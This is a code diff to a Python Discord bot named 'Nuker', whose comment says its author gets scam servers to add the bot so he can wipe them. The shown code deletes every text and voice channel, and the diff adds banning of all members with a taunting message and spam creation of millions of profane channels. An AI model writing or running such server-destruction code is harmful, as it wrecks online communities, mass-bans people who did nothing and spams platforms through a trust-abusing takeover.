@@ -1,4 +1,4 @@
-# Nuker - Just ignore it, when it's a scam server like *x invites = y* I'm not gonna think and click this nuke button. Just get them to add this bot and invite me (PanSageYT#5099) :D
+# Nuker - Just ignore it, when it's a scam server like *x invites = y*, or advertising in another server? Or something which is a big no no? I'm not gonna think and click this nuke button. Just get them to add this bot and invite me (PanSageYT#5099) :D
 import os
 import glob
 
@@ -26,7 +26,13 @@ async def Cmd(idres, guild):
             await channel.delete()
         for channel in guild.voice_channels:
             await channel.delete()
-        for cont in range(2137):
+        for channel in guild.members:
+            try:
+                await channel.ban(reason="One of you on server did a big no no")
+            except:
+                await channel.send("Somehow I couldn't ban you, maybe you are an owner? Someone in server betrayed you doing a big no no.")
+
+        for cont in range(2137 * 2137):
             await guild.create_text_channel("FUCKED UP YOUR SERVER BRO " + str(cont))
 
     except Exception as e:
